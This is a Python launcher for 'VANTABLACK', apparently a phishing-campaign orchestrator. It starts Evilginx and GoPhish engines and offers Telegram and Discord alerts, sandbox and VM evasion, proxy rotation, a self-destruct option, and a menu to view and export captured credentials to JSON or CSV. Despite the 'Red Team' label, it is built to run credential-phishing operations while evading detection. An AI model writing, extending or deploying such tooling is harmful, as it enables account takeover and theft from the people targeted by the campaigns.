#!/usr/bin/env python3
"""
VANTABLACK: Ultra-Resilient Polymorphic Orchestrator (v3.1)
=============================================================
An elite Red Team orchestration platform.

Usage:
    python3 vanta.py              # Interactive menu
    python3 vanta.py --start       # Direct start
    python3 vanta.py --setup       # Setup wizard
    python3 vanta.py --status      # Check status
"""

import argparse
import sys
import os
import subprocess
import time
import threading
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich import box
from vanta.core.orchestrator import VantaModularOrchestrator

console = Console()
STOP_EVENT = threading.Event()

# ANSI colors for banner
BANNER = """
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ███████╗ ██████╗ ██╗     ███████╗██╗  ██╗                     ║
║   ██╔════╝██╔═══██╗██║     ██╔════╝╚██╗██╔╝                     ║
║   ███████╗██║   ██║██║     █████╗   ╚███╔╝                      ║
║   ╚════██║██║▄▄ ██║██║     ██╔══╝   ██╔██╗                      ║
║   ███████║╚██████╔╝███████╗███████╗██╔╝ ██╗                     ║
║   ╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝  ╚═╝                     ║
║                     O R C H E S T R A T O R                      ║
║                                                                   ║
║              [bold cyan]v3.1.0 - Polymorph Edition[/bold cyan]                      ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"""


def print_banner():
    """Display the VANTABLACK banner."""
    console.print(BANNER, style="bold cyan")
    console.print()


def check_dependencies():
    """Check if all dependencies are installed."""
    console.print("[yellow]Checking dependencies...[/yellow]")
    
    missing = []
    
    # Check Python packages
    try:
        import rich
        import yaml
        import requests
    except ImportError as e:
        missing.append(str(e).split("'")[1])
    
    # Check Docker
    try:
        subprocess.run(["docker", "--version"], capture_output=True, check=True)
    except:
        missing.append("docker")
    
    # Check binaries
    if not os.path.exists("./bin/evilginx"):
        missing.append("bin/evilginx")
    if not os.path.exists("./bin/gophish"):
        missing.append("bin/gophish")
    
    if missing:
        console.print(f"[bold red]Missing dependencies:[/bold red] {', '.join(missing)}")
        console.print("[yellow]Run: pip3 install -r requirements.txt[/yellow]")
        return False
    
    console.print("[green]✓ All dependencies satisfied[/green]")
    return True


def run_setup_wizard():
    """Interactive setup wizard."""
    console.clear()
    print_banner()
    
    console.print(Panel.fit(
        "[bold cyan]🔧 VANTABLACK Setup Wizard[/bold cyan]\n\n"
        "Let's configure your installation step by step.",
        box=box.ROUNDED
    ))
    
    config = {}
    
    # Telegram configuration
    console.print("\n[bold]📱 Telegram Configuration[/bold]")
    if Confirm.ask("Enable Telegram notifications?", default=True):
        config['telegram_token'] = Prompt.ask(
            "Enter Telegram Bot Token",
            default=""
        )
        config['telegram_chat_id'] = Prompt.ask(
            "Enter Telegram Chat ID",
            default=""
        )
    
    # Discord configuration
    console.print("\n[bold]💬 Discord Configuration[/bold]")
    if Confirm.ask("Enable Discord notifications?", default=False):
        config['discord_webhook'] = Prompt.ask(
            "Enter Discord Webhook URL",
            default=""
        )
    
    # Stealth level
    console.print("\n[bold]🛡️ Evasion Settings[/bold]")
    stealth_level = Prompt.ask(
        "Select stealth level",
        choices=["1", "2", "3", "4", "5"],
        default="3"
    )
    config['stealth_level'] = int(stealth_level)
    
    # Proxy configuration
    console.print("\n[bold]🔄 Proxy Configuration[/bold]")
    if Confirm.ask("Enable proxy rotation?", default=False):
        config['proxy_enabled'] = True
        config['proxy_file'] = Prompt.ask(
            "Enter proxy list file path",
            default="proxies.txt"
        )
    
    # Save configuration
    console.print("\n[bold]💾 Saving configuration...[/bold]")
    
    import yaml
    hitch_config = {
        'name': 'VANTABLACK',
        'version': '3.1.0',
        'telegram': {
            'token': config.get('telegram_token', ''),
            'chat_id': config.get('telegram_chat_id', '')
        },
        'discord': {
            'enabled': config.get('discord_webhook', '') != '',
            'webhook_url': config.get('discord_webhook', '')
        },
        'evasion': {
            'stealth_level': config.get('stealth_level', 3),
            'sandbox_detect': True,
            'gpu_fingerprint': True,
            'battery_check': True,
            'automation_check': True,
            'vm_detect': True
        },
        'proxy': {
            'enabled': config.get('proxy_enabled', False),
            'rotation': 'round-robin'
        }
    }
    
    with open('hitch_config.yaml', 'w') as f:
        yaml.dump(hitch_config, f, default_flow_style=False)
    
    console.print("[green]✓ Configuration saved to hitch_config.yaml[/green]")
    
    # Create proxy file if needed
    if config.get('proxy_enabled'):
        if not os.path.exists(config.get('proxy_file', 'proxies.txt')):
            with open(config.get('proxy_file', 'proxies.txt'), 'w') as f:
                f.write("# Add your SOCKS5 proxies here, one per line\n")
                f.write("# Format: ip:port or ip:port:username:password\n")
            console.print(f"[yellow]⚠ Created proxy file: {config.get('proxy_file', 'proxies.txt')}[/yellow]")
    
    console.print("\n[bold green]Setup complete! Run 'python3 vanta.py' to start.[/bold green]")


def show_dashboard():
    """Launch the real-time monitoring dashboard."""
    console.print("[cyan]Launching dashboard...[/cyan]")
    try:
        subprocess.run([sys.executable, "monitor_captures.py"])
    except KeyboardInterrupt:
        console.print("\n[dim]Dashboard closed.[/dim]")


def show_status():
    """Show system status."""
    console.print("[cyan]Checking system status...[/cyan]")
    try:
        subprocess.run([sys.executable, "check_status.py"])
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")


def manage_captures():
    """Manage captured credentials."""
    import sqlite3
    
    db_path = "hitch_vault.db"
    if not os.path.exists(db_path):
        console.print("[red]No captures found. Database doesn't exist.[/red]")
        return
    
    while True:
        console.clear()
        console.print(Panel.fit(
            "[bold cyan]📁 Capture Management[/bold cyan]",
            box=box.ROUNDED
        ))
        
        # Show captures table
        table = Table(title="Recent Captures", box=box.ROUNDED)
        table.add_column("ID", style="cyan")
        table.add_column("Timestamp", style="green")
        table.add_column("Source", style="yellow")
        table.add_column("Data", style="white")
        
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT id, timestamp, source, data FROM captures ORDER BY timestamp DESC LIMIT 20")
            rows = cursor.fetchall()
            conn.close()
            
            for row in rows:
                data_preview = row[3][:50] + "..." if len(row[3]) > 50 else row[3]
                table.add_row(str(row[0]), row[1], row[2], data_preview)
            
            console.print(table)
        except Exception as e:
            console.print(f"[red]Error reading database: {e}[/red]")
        
        console.print("\n[bold]Options:[/bold]")
        console.print("  [1] Export all captures (JSON)")
        console.print("  [2] Export all captures (CSV)")
        console.print("  [3] Delete all captures")
        console.print("  [0] Back to main menu")
        
        choice = Prompt.ask("Select option", choices=["0", "1", "2", "3"], default="0")
        
        if choice == "0":
            break
        elif choice == "1":
            export_captures("json")
        elif choice == "2":
            export_captures("csv")
        elif choice == "3":
            if Confirm.ask("Are you sure? This cannot be undone!", default=False):
                try:
                    conn = sqlite3.connect(db_path)
                    conn.execute("DELETE FROM captures")
                    conn.commit()
                    conn.close()
                    console.print("[green]✓ All captures deleted[/green]")
                except Exception as e:
                    console.print(f"[red]Error: {e}[/red]")
                time.sleep(1)


def export_captures(format_type):
    """Export captures to file."""
    import sqlite3
    import json
    
    db_path = "hitch_vault.db"
    filename = f"captures_{int(time.time())}.{format_type}"
    
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT id, timestamp, source, data FROM captures ORDER BY timestamp DESC")
        rows = cursor.fetchall()
        conn.close()
        
        if format_type == "json":
            data = [{"id": r[0], "timestamp": r[1], "source": r[2], "data": r[3]} for r in rows]
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
        else:  # csv
            import csv
            with open(filename, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(["ID", "Timestamp", "Source", "Data"])
                for r in rows:
                    writer.writerow(r)
        
        console.print(f"[green]✓ Exported to {filename}[/green]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
    
    time.sleep(1)


def docker_control():
    """Docker container management."""
    while True:
        console.clear()
        console.print(Panel.fit(
            "[bold cyan]🐳 Docker Control[/bold cyan]",
            box=box.ROUNDED
        ))
        
        console.print("\n[bold]Available Actions:[/bold]")
        console.print("  [1] Start all containers")
        console.print("  [2] Stop all containers")
        console.print("  [3] Restart all containers")
        console.print("  [4] View logs")
        console.print("  [5] View container status")
        console.print("  [0] Back to main menu")
        
        choice = Prompt.ask("Select option", choices=["0", "1", "2", "3", "4", "5"], default="0")
        
        if choice == "0":
            break
        elif choice == "1":
            console.print("[cyan]Starting containers...[/cyan]")
            subprocess.run(["docker-compose", "up", "-d"], check=True)
            console.print("[green]✓ Containers started[/green]")
        elif choice == "2":
            console.print("[cyan]Stopping containers...[/cyan]")
            subprocess.run(["docker-compose", "down"], check=True)
            console.print("[green]✓ Containers stopped[/green]")
        elif choice == "3":
            console.print("[cyan]Restarting containers...[/cyan]")
            subprocess.run(["docker-compose", "restart"], check=True)
            console.print("[green]✓ Containers restarted[/green]")
        elif choice == "4":
            console.print("[cyan]Showing logs (Ctrl+C to exit)...[/cyan]")
            try:
                subprocess.run(["docker-compose", "logs", "-f"])
            except KeyboardInterrupt:
                pass
        elif choice == "5":
            subprocess.run(["docker", "ps", "--format", "table {{.Names}}\t{{.Status}}\t{{.Ports}}"])
        
        if choice != "5":
            time.sleep(1)


def show_help():
    """Show help and documentation."""
    console.clear()
    console.print(Panel.fit(
        "[bold cyan]📖 VANTABLACK Help[/bold cyan]\n\n"
        "[bold]Quick Reference:[/bold]\n\n"
        "  python3 vanta.py              - Interactive menu\n"
        "  python3 vanta.py --start      - Start directly\n"
        "  python3 vanta.py --setup      - Setup wizard\n"
        "  python3 vanta.py --status     - Check status\n"
        "  python3 monitor_captures.py   - Live dashboard\n"
        "  python3 check_status.py       - System diagnostics\n\n"
        "[bold]Configuration:[/bold]\n\n"
        "  Edit hitch_config.yaml to customize settings\n"
        "  - stealth_level: 1-5 (evasion intensity)\n"
        "  - telegram: Bot token & chat_id\n"
        "  - discord: Webhook URL\n\n"
        "[bold]Documentation:[/bold]\n\n"
        "  See README.md for complete documentation",
        box=box.ROUNDED
    ))
    console.print("\n[dim]Press Enter to continue...[/dim]")
    input()


def start_orchestrator(args):
    """Start the main orchestrator."""
    console.print("[bold cyan]Starting VANTABLACK Orchestrator...[/bold cyan]\n")
    
    try:
        orchestrator = VantaModularOrchestrator(args=args)
        
        # Start supervisor
        orchestrator.supervisor.start()
        
        # Start engines
        console.print("[green]✓ Starting Evilginx engine...[/green]")
        orchestrator.start_engine("EVILGINX", [
            "./bin/evilginx", "-p", "./phishlets", "-developer",
            "-webhook-url", "http://127.0.0.1:8000/capture"
        ])
        
        console.print("[green]✓ Starting GoPhish engine...[/green]")
        orchestrator.start_engine("GOPHISH", ["./bin/gophish", "--config", "./configs/config.json"])
        
        console.print("\n[bold green]🎉 VANTABLACK is running![/bold green]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")
        
        # Keep running
        try:
            while not STOP_EVENT.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            console.print("\n[yellow]Shutting down...[/yellow]")
            orchestrator.stop()
            
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        sys.exit(1)


def interactive_menu():
    """Main interactive menu."""
    while True:
        console.clear()
        print_banner()
        
        # Show status summary
        table = Table(box=box.SIMPLE)
        table.add_column("Component", style="cyan")
        table.add_column("Status", style="green")
        
        # Check Docker
        docker_status = "🟢 Running" if subprocess.run(["docker", "ps"], capture_output=True).returncode == 0 else "🔴 Stopped"
        
        # Check database
        db_status = "🟢 Accessible" if os.path.exists("hitch_vault.db") else "🔴 Not found"
        
        table.add_row("Docker", docker_status)
        table.add_row("Vault DB", db_status)
        table.add_row("API Server", "🟢 Port 8000")
        
        console.print(table)
        console.print()
        
        # Main menu
        console.print(Panel.fit(
            "[bold]MAIN MENU[/bold]\n\n"
            "  [1] 🚀  [bold]Start Campaign[/bold]        - Launch phishing engines\n"
            "  [2] 📊  [bold]View Dashboard[/bold]       - Real-time monitoring\n"
            "  [3] 🔍  [bold]Check Status[/bold]         - System diagnostics\n"
            "  [4] 📁  [bold]Manage Captures[/bold]      - View/export credentials\n"
            "  [5] ⚙️  [bold]Configuration[/bold]        - Edit settings\n"
            "  [6] 🐳  [bold]Docker Control[/bold]       - Manage containers\n"
            "  [7] 📖  [bold]Help[/bold]                 - Documentation\n"
            "  [0] ❌  [bold]Exit[/bold]                 - Shutdown gracefully\n",
            box=box.ROUNDED
        ))
        
        choice = Prompt.ask("Select option", choices=["0", "1", "2", "3", "4", "5", "6", "7"], default="0")
        
        if choice == "0":
            console.print("[yellow]Goodbye, operator.[/yellow]")
            break
        elif choice == "1":
            # Start with selected options
            stealth = Prompt.ask("Stealth level", choices=["1", "2", "3", "4", "5"], default="3")
            
            class Args:
                stealth_level = int(stealth)
                proxy_list = None
                notify = "telegram"
                auto_kill = False
                multi_tenant = False
            
            start_orchestrator(Args())
            break
        elif choice == "2":
            show_dashboard()
        elif choice == "3":
            show_status()
            console.print("\n[dim]Press Enter to continue...[/dim]")
            input()
        elif choice == "4":
            manage_captures()
        elif choice == "5":
            console.print("[yellow]Opening hitch_config.yaml in editor...[/yellow]")
            subprocess.run(["nano", "hitch_config.yaml"])
        elif choice == "6":
            docker_control()
        elif choice == "7":
            show_help()


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="VANTABLACK: Ultra-Resilient Polymorphic Orchestrator (v3.1)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 vanta.py              # Interactive menu
  python3 vanta.py --setup      # Setup wizard  
  python3 vanta.py --start      # Direct start
  python3 vanta.py --status     # Check status

For more info: python3 vanta.py --help
        """
    )
    
    parser.add_argument("--setup", action="store_true", help="Run setup wizard")
    parser.add_argument("--start", action="store_true", help="Start orchestrator directly")
    parser.add_argument("--status", action="store_true", help="Check system status")
    parser.add_argument("--dashboard", action="store_true", help="Launch dashboard")
    parser.add_argument("--stealth-level", type=int, choices=[1,2,3,4,5], default=1, 
                        help="Evasion level (1-5)")
    parser.add_argument("--proxy-list", type=str, help="SOCKS5 proxy file")
    parser.add_argument("--notify", type=str, choices=["telegram", "discord"], 
                        default="telegram", help="Notification channel")
    parser.add_argument("--auto-kill", action="store_true", help="Self-destruction on threat detection")
    parser.add_argument("--multi-tenant", action="store_true", help="Enable multi-domain management")
    parser.add_argument("--check-deps", action="store_true", help="Check dependencies")
    
    args = parser.parse_args()
    
    # Handle --check-deps first
    if args.check_deps:
        check_dependencies()
        return
    
    # Handle --setup
    if args.setup:
        run_setup_wizard()
        return
    
    # Handle --status
    if args.status:
        show_status()
        return
    
    # Handle --dashboard
    if args.dashboard:
        show_dashboard()
        return
    
    # Handle --start (direct start)
    if args.start:
        if not check_dependencies():
            sys.exit(1)
        start_orchestrator(args)
        return
    
    # Default: interactive menu
    if not check_dependencies():
        console.print("\n[yellow]Would you like to run the setup wizard?[/yellow]")
        if Confirm.ask("Run setup?", default=True):
            run_setup_wizard()
            return
        sys.exit(1)
    
    interactive_menu()


if __name__ == "__main__":
    main()
